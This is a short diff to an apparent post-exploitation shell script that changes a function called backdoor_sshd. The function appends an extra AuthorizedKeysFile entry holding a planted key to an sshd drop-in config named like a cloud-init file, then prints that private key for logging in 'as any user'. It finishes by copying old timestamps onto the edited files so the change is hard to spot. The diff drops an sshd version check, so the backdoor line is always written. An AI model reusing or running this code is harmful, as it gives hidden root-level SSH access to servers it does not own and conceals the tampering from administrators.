@@ -1811,8 +1811,7 @@ backdoor_sshd() {
 	N="${D}/${N:-50-cloud-init.conf}"
 	{ [ ! -f "$K" ] || [ ! -f "$K".pub ]; } && return
 	grep -qm1 '^AuthorizedKeysFile' "$N" 2>/dev/null && return
-	/usr/sbin/sshd -V 2>&1 | grep -qE 'SSH_(9|[1-9]{1}[0-9]{1})' || EGG="Y"
-	echo -e "AuthorizedKeysFile\t${EGG:+.ssh/authorized_keys .ssh/authorized_keys2 }${K}.pub" >>"${N}" || return
+	echo -e "AuthorizedKeysFile\t.ssh/authorized_keys .ssh/authorized_keys2 ${K}.pub" >>"${N}" || return
 	echo -e "\e[0;31mYour id_ed25519 to log in to this server as any user:\e[0;33m\n$(cat "${K}")\e[0m"
 	touch -r "$K" "$N" "$D" \
 	&& declare -f ctime >/dev/null && ctime "$N" "$D"
